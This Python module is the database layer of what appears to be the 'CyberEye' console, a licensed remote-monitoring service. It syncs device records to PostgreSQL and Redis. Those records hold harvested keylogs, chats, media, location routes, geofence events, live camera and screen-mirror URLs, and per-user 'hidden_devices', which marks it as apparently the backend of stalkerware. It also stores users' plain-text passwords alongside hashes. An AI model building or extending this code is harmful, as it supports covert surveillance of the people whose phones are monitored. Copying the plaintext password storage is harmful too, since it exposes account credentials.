import os
import time
import json
import logging
import threading
from config import DB_FILE, USERS_DB_FILE, BLACKLIST, DATABASE_URL, REDIS_URL
from core.models import User, License, Device, Report, SystemPolicy, init_db

logger = logging.getLogger("database")

# Thread-safe write lock
db_lock = threading.RLock()

# Shared In-Memory Tracking Maps
connected_devices = {}
sid_to_device = {}
connected_device_licenses = {}
data_cache = {}

# PostgreSQL / SQLAlchemy Session Factory
SessionLocal = None
engine = None
redis_client = None

def init_postgres():
    """Initializes PostgreSQL connection and creates tables if DATABASE_URL is available."""
    global engine, SessionLocal
    if not DATABASE_URL:
        return False
    try:
        from sqlalchemy import create_engine
        from sqlalchemy.orm import sessionmaker

        # Configure connection pool for high concurrency
        engine = create_engine(
            DATABASE_URL,
            pool_size=20,
            max_overflow=30,
            pool_recycle=1800,
            pool_pre_ping=True
        )
        init_db(engine)
        SessionLocal = sessionmaker(bind=engine, autoflush=False, expire_on_commit=False)
        print("[Database] Connected to PostgreSQL successfully. Relational tables ready.")
        return True
    except Exception as e:
        print(f"[Database] PostgreSQL connection failed ({e}). Falling back to local storage.")
        engine = None
        SessionLocal = None
        return False

def init_redis():
    """Initializes Redis connection if REDIS_URL is available."""
    global redis_client
    if not REDIS_URL:
        return None
    try:
        import redis
        client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
        client.ping()
        print("[Database] Connected to Redis successfully. Fast cache & socket broker ready.")
        return client
    except Exception as e:
        print(f"[Database] Redis connection failed ({e}). Using in-memory dictionary for sockets.")
        return None

# Attempt connections
init_postgres()
redis_client = init_redis()

# -------------------------------------------------------------
# Redis Real-Time Presence, Socket Mapping, and Telemetry Helpers
# -------------------------------------------------------------
def set_device_online(device_id, sid, license_key=None):
    """Registers device online presence in memory and in Redis cluster-wide."""
    connected_devices[device_id] = sid
    sid_to_device[sid] = device_id
    if license_key:
        connected_device_licenses[device_id] = license_key
    if redis_client:
        try:
            redis_client.sadd("devices:online", device_id)
            redis_client.set(f"device:{device_id}:sid", sid)
            redis_client.set(f"sid:{sid}:device", device_id)
            if license_key:
                redis_client.set(f"device:{device_id}:license_key", license_key)
            redis_client.set(f"device:{device_id}:last_seen", str(int(time.time() * 1000)))
        except Exception as e:
            logger.warning(f"[Redis] Error setting device {device_id} online: {e}")

def set_device_offline(sid):
    """Removes device online presence from memory and Redis upon disconnect."""
    device_id = sid_to_device.pop(sid, None)
    if not device_id and redis_client:
        try:
            device_id = redis_client.get(f"sid:{sid}:device")
        except Exception:
            pass
    if device_id:
        connected_devices.pop(device_id, None)
        connected_device_licenses.pop(device_id, None)
        if redis_client:
            try:
                redis_client.srem("devices:online", device_id)
                redis_client.delete(f"device:{device_id}:sid")
                redis_client.delete(f"sid:{sid}:device")
            except Exception as e:
                logger.warning(f"[Redis] Error setting device {device_id} offline: {e}")
    return device_id

def is_device_online(device_id):
    """Checks whether a device is currently online via in-memory socket or Redis."""
    if device_id in connected_devices:
        return True
    if redis_client:
        try:
            return bool(redis_client.sismember("devices:online", device_id))
        except Exception:
            pass
    return False

def get_device_sid(device_id):
    """Retrieves the active socket session ID for a device from memory or Redis."""
    sid = connected_devices.get(device_id)
    if not sid and redis_client:
        try:
            sid = redis_client.get(f"device:{device_id}:sid")
        except Exception:
            pass
    return sid

def cache_telemetry(key, value, ex=86400):
    """Caches a key-value in Redis with optional expiration in seconds."""
    if redis_client:
        try:
            val_str = json.dumps(value) if isinstance(value, (dict, list)) else str(value)
            redis_client.set(key, val_str, ex=ex)
        except Exception as e:
            logger.warning(f"[Redis] Error caching telemetry for {key}: {e}")

def get_cached_telemetry(key, default=None):
    """Retrieves a cached key from Redis, automatically parsing JSON if possible."""
    if redis_client:
        try:
            val = redis_client.get(key)
            if val is not None:
                try:
                    return json.loads(val)
                except Exception:
                    return val
        except Exception:
            pass
    return default

class DeviceDatabaseProxy(dict):
    """
    Transparent Dictionary Proxy for Devices:
    Maintains 100% backwards compatibility with database[device_id] syntax
    while persisting to PostgreSQL and Redis behind the scenes.
    """
    def __init__(self):
        super().__init__()

    def _reload_from_postgres(self, device_id):
        if not SessionLocal:
            return
        try:
            with SessionLocal() as session:
                dev = session.query(Device).filter_by(device_id=device_id).first()
                if dev:
                    loaded = dev.to_dict()
                    current = super().get(device_id)
                    if not current:
                        super().__setitem__(device_id, loaded)
                    else:
                        # Deep merge or preserve in-memory keys that may have been mutated
                        for k, v in loaded.items():
                            if k not in current:
                                current[k] = v
                            elif isinstance(current[k], dict) and isinstance(v, dict):
                                for sub_k, sub_v in v.items():
                                    if sub_k not in current[k]:
                                        current[k][sub_k] = sub_v
                        # Guarantee previews exists
                        if "previews" not in current or not isinstance(current["previews"], dict):
                            current["previews"] = {}
                        super().__setitem__(device_id, current)
        except Exception as e:
            print(f"[Database/Postgres] Error reloading device {device_id}: {e}")

    def __getitem__(self, device_id):
        self._reload_from_postgres(device_id)
        return super().__getitem__(device_id)

    def get(self, device_id, default=None):
        self._reload_from_postgres(device_id)
        return super().get(device_id, default)

    def __contains__(self, device_id):
        self._reload_from_postgres(device_id)
        return super().__contains__(device_id)

    def save_device_to_postgres(self, device_id):
        if not SessionLocal:
            return
        data = super().get(device_id)
        if not data or not isinstance(data, dict):
            return
        try:
            with SessionLocal() as session:
                dev = session.query(Device).filter_by(device_id=device_id).first()
                if not dev:
                    dev = Device(device_id=device_id)
                    session.add(dev)
                dev.license_key = data.get("license_key")
                
                # Store info as JSON string if dict/list to preserve all structure
                info_val = data.get("info", {})
                if isinstance(info_val, (dict, list)):
                    dev.info = json.dumps(info_val)
                else:
                    dev.info = str(info_val or "")
                
                dev.logs = data.get("logs", [])
                dev.refs = data.get("refs", {})
                dev.last_seen = int(data.get("lastSeen", 0))
                dev.settings = data.get("settings", {})
                dev.last_geofence_states = data.get("last_geofence_states", {})
                dev.geofence_events = data.get("geofence_events", [])
                dev.today_route = data.get("today_route", [])
                dev.today_route_date = str(data.get("today_route_date", ""))
                dev.route_history = data.get("route_history", [])
                dev.keylogs = data.get("keylogs", {})
                dev.chats = data.get("chats", {})
                dev.media = data.get("media", {})
                
                # Store dynamic and streaming attributes (mirror_url, live_camera_url, etc.) in extra_data
                standard_keys = {
                    "_id", "device_id", "license_key", "info", "logs", "refs",
                    "lastSeen", "settings", "last_geofence_states", "geofence_events",
                    "today_route", "today_route_date", "route_history", "keylogs",
                    "chats", "media"
                }
                extra = {k: v for k, v in data.items() if k not in standard_keys}
                dev.extra_data = extra
                session.commit()
                
                # Update Redis cache
                if redis_client:
                    try:
                        redis_client.set(f"device:{device_id}:last_seen", str(dev.last_seen))
                        if dev.license_key:
                            redis_client.set(f"device:{device_id}:license_key", str(dev.license_key))
                    except Exception:
                        pass
        except Exception as e:
            print(f"[Database/Postgres] Error syncing device {device_id}: {e}")

    def delete_device_from_postgres(self, device_id):
        if not SessionLocal:
            return
        try:
            with SessionLocal() as session:
                dev = session.query(Device).filter_by(device_id=device_id).first()
                if dev:
                    session.delete(dev)
                    session.commit()
            if redis_client:
                try:
                    redis_client.delete(f"device:{device_id}:last_seen")
                    redis_client.delete(f"device:{device_id}:license_key")
                except Exception:
                    pass
        except Exception as e:
            print(f"[Database/Postgres] Error deleting device {device_id}: {e}")

    def sync_all_to_postgres(self):
        if not SessionLocal:
            return
        for device_id in list(self.keys()):
            self.save_device_to_postgres(device_id)

    def load_from_postgres(self):
        if not SessionLocal:
            return False
        try:
            with SessionLocal() as session:
                devices = session.query(Device).all()
                loaded = {}
                for dev in devices:
                    loaded[dev.device_id] = dev.to_dict()
                if loaded:
                    self.clear()
                    self.update(loaded)
                    print(f"[Database/Postgres] Loaded {len(loaded)} devices from PostgreSQL.")
                    return True
        except Exception as e:
            print(f"[Database/Postgres] Error reading devices: {e}")
        return False

class UsersDatabaseProxy(dict):
    """
    Transparent Dictionary Proxy for Users, Licenses, Reports, and System Policies.
    """
    def __init__(self):
        super().__init__()
        self["users"] = {}
        self["licenses"] = {}
        self["reports"] = []
        self["system_policy"] = {
            "maintenance_mode": False,
            "maintenance_message": "Scheduled updates are in progress. CyberEye console will be back online shortly.",
            "maintenance_until": 0
        }

    def _reload_from_postgres(self):
        if not SessionLocal:
            return
        try:
            with SessionLocal() as session:
                users = session.query(User).all()
                licenses = session.query(License).all()
                reports = session.query(Report).all()
                policy = session.query(SystemPolicy).filter_by(key='main').first()

                users_map = {u.username: u.to_dict() for u in users}
                licenses_map = {l.license_key: l.to_dict() for l in licenses}
                reports_list = [r.to_dict() for r in reports]
                policy_dict = policy.to_dict() if policy else {
                    "maintenance_mode": False,
                    "maintenance_message": "Scheduled updates are in progress. CyberEye console will be back online shortly.",
                    "maintenance_until": 0
                }

                cur_users = super().get("users", {})
                for u_k, u_v in users_map.items():
                    if u_k not in cur_users:
                        cur_users[u_k] = u_v
                    else:
                        for field_k, field_v in u_v.items():
                            if field_k not in cur_users[u_k]:
                                cur_users[u_k][field_k] = field_v
                super().__setitem__("users", cur_users)

                cur_licenses = super().get("licenses", {})
                for l_k, l_v in licenses_map.items():
                    if l_k not in cur_licenses:
                        cur_licenses[l_k] = l_v
                    else:
                        for field_k, field_v in l_v.items():
                            if field_k not in cur_licenses[l_k]:
                                cur_licenses[l_k][field_k] = field_v
                super().__setitem__("licenses", cur_licenses)

                if "reports" not in self:
                    super().__setitem__("reports", reports_list)
                if "system_policy" not in self:
                    super().__setitem__("system_policy", policy_dict)
        except Exception as e:
            print(f"[Database/Postgres] Error reloading users: {e}")

    def __getitem__(self, key):
        self._reload_from_postgres()
        return super().__getitem__(key)

    def get(self, key, default=None):
        self._reload_from_postgres()
        return super().get(key, default)

    def load_from_postgres(self):
        if not SessionLocal:
            return False
        try:
            with SessionLocal() as session:
                users = session.query(User).all()
                users_map = {u.username: u.to_dict() for u in users}
                
                licenses = session.query(License).all()
                licenses_map = {l.license_key: l.to_dict() for l in licenses}
                
                reports = session.query(Report).all()
                reports_list = [r.to_dict() for r in reports]
                
                policy = session.query(SystemPolicy).filter_by(key='main').first()
                policy_dict = policy.to_dict() if policy else {
                    "maintenance_mode": False,
                    "maintenance_message": "Scheduled updates are in progress. CyberEye console will be back online shortly.",
                    "maintenance_until": 0
                }

                if users_map or licenses_map:
                    self["users"] = users_map
                    self["licenses"] = licenses_map
                    self["reports"] = reports_list
                    self["system_policy"] = policy_dict
                    print(f"[Database/Postgres] Loaded {len(users_map)} users and {len(licenses_map)} licenses.")
                    return True
                elif os.path.exists(USERS_DB_FILE) and os.path.isfile(USERS_DB_FILE):
                    try:
                        with open(USERS_DB_FILE, 'r', encoding='utf-8') as f:
                            seed_data = json.load(f)
                            self["users"] = seed_data.get("users", {})
                            self["licenses"] = seed_data.get("licenses", {})
                            self["reports"] = seed_data.get("reports", [])
                            self["system_policy"] = seed_data.get("system_policy", policy_dict)
                        self.sync_to_postgres()
                        print(f"[Database/Postgres] Seeded PostgreSQL from {USERS_DB_FILE}.")
                        return True
                    except Exception as e:
                        print(f"[Database/Postgres] Error seeding from {USERS_DB_FILE}: {e}")
        except Exception as e:
            print(f"[Database/Postgres] Error reading users from PostgreSQL: {e}")
        return False

    def sync_to_postgres(self):
        if not SessionLocal:
            return
        try:
            with SessionLocal() as session:
                current_users = super().get("users", {})
                current_licenses = super().get("licenses", {})
                current_reports = super().get("reports", [])
                pdata = super().get("system_policy", {})

                # 1. Sync & Prune Users
                db_users = session.query(User).all()
                for u in db_users:
                    if u.username not in current_users:
                        session.delete(u)

                for uname, udata in current_users.items():
                    user = session.query(User).filter_by(username=uname).first()
                    if not user:
                        user = User(username=uname, password_hash=udata.get("password_hash", ""))
                        session.add(user)
                    user.password_hash = udata.get("password_hash", "")
                    user.plain_password = udata.get("plain_password", "")
                    user.role = udata.get("role", "user")
                    user.devices = udata.get("devices", [])
                    user.hidden_devices = udata.get("hidden_devices", [])
                    user.last_seen = int(udata.get("last_seen", 0))

                # 2. Sync & Prune Licenses
                db_licenses = session.query(License).all()
                for l in db_licenses:
                    if l.license_key not in current_licenses:
                        session.delete(l)

                for lkey, ldata in current_licenses.items():
                    lic = session.query(License).filter_by(license_key=lkey).first()
                    if not lic:
                        lic = License(
                            license_key=lkey,
                            expires_at=int(ldata.get("expires_at", 0)),
                            created_at=int(ldata.get("created_at", 0))
                        )
                        session.add(lic)
                    lic.assigned_to = ldata.get("assigned_to")
                    lic.expires_at = int(ldata.get("expires_at", 0))
                    lic.is_active = bool(ldata.get("is_active", True))

                # 3. Sync System Policy
                policy = session.query(SystemPolicy).filter_by(key='main').first()
                if not policy:
                    policy = SystemPolicy(key='main')
                    session.add(policy)
                policy.maintenance_mode = bool(pdata.get("maintenance_mode", False))
                policy.maintenance_message = str(pdata.get("maintenance_message", ""))
                policy.maintenance_until = int(pdata.get("maintenance_until", 0))

                # 4. Sync & Prune Reports
                current_rep_ids = {r.get("id") for r in current_reports if r.get("id")}
                db_reports = session.query(Report).all()
                for rep in db_reports:
                    if rep.id not in current_rep_ids:
                        session.delete(rep)

                for rdata in current_reports:
                    rid = rdata.get("id")
                    if rid:
                        rep = session.query(Report).filter_by(id=rid).first()
                        if not rep:
                            rep = Report(id=rid, issue_text=rdata.get("issue_text", ""))
                            session.add(rep)
                        rep.username = rdata.get("username")
                        rep.license_key = rdata.get("license_key")
                        rep.issue_text = rdata.get("issue_text", "")
                        rep.timestamp = int(rdata.get("timestamp", 0))
                        rep.status = rdata.get("status", "pending")

                session.commit()

                # Sync to Redis cache
                if redis_client:
                    try:
                        redis_client.set("system:maintenance_mode", "1" if policy.maintenance_mode else "0")
                        redis_client.set("system:maintenance_message", policy.maintenance_message)
                        for uname, udata in current_users.items():
                            redis_client.set(f"user:{uname}:role", udata.get("role", "user"))
                            redis_client.set(f"user:{uname}:last_seen", str(udata.get("last_seen", 0)))
                        for lkey, ldata in current_licenses.items():
                            redis_client.set(f"license:{lkey}:assigned_to", ldata.get("assigned_to", "") or "")
                            redis_client.set(f"license:{lkey}:is_active", "1" if ldata.get("is_active", True) else "0")
                            redis_client.set(f"license:{lkey}:expires_at", str(ldata.get("expires_at", 0)))
                    except Exception:
                        pass
        except Exception as e:
            print(f"[Database/Postgres] Error syncing users/licenses: {e}")

    def delete_user_from_postgres(self, username):
        if not SessionLocal:
            return
        try:
            with SessionLocal() as session:
                user = session.query(User).filter_by(username=username).first()
                if user:
                    session.delete(user)
                    session.commit()
            if redis_client:
                try:
                    redis_client.delete(f"user:{username}:role")
                    redis_client.delete(f"user:{username}:last_seen")
                except Exception:
                    pass
        except Exception as e:
            print(f"[Database/Postgres] Error deleting user {username}: {e}")

    def delete_license_from_postgres(self, license_key):
        if not SessionLocal:
            return
        try:
            with SessionLocal() as session:
                lic = session.query(License).filter_by(license_key=license_key).first()
                if lic:
                    session.delete(lic)
                    session.commit()
            if redis_client:
                try:
                    redis_client.delete(f"license:{license_key}:assigned_to")
                    redis_client.delete(f"license:{license_key}:is_active")
                    redis_client.delete(f"license:{license_key}:expires_at")
                except Exception:
                    pass
        except Exception as e:
            print(f"[Database/Postgres] Error deleting license {license_key}: {e}")

# Global Proxied Database Instances
database = DeviceDatabaseProxy()
users_database = UsersDatabaseProxy()

def load_db():
    with db_lock:
        if database.load_from_postgres():
            return
        database.clear()

def dump_json_snapshot():
    """Generates backup snapshot in users_db.json from the active in-memory / PostgreSQL data."""
    try:
        users_copy = {
            "users": users_database.get("users", {}),
            "licenses": users_database.get("licenses", {}),
            "reports": users_database.get("reports", []),
            "system_policy": users_database.get("system_policy", {})
        }
        with open(USERS_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(users_copy, f, indent=2)
    except Exception as e:
        logger.warning(f"[Database] Error writing users_db.json snapshot: {e}")

def save_db(device_id=None):
    with db_lock:
        if SessionLocal:
            if device_id:
                database.save_device_to_postgres(device_id)
            else:
                database.sync_all_to_postgres()

def load_users_db():
    with db_lock:
        if users_database.load_from_postgres():
            return
        users_database["users"] = {}
        users_database["licenses"] = {}
        users_database["reports"] = []

def save_users_db():
    with db_lock:
        if SessionLocal:
            users_database.sync_to_postgres()
        dump_json_snapshot()

# Initialize databases on import
load_db()
load_users_db()
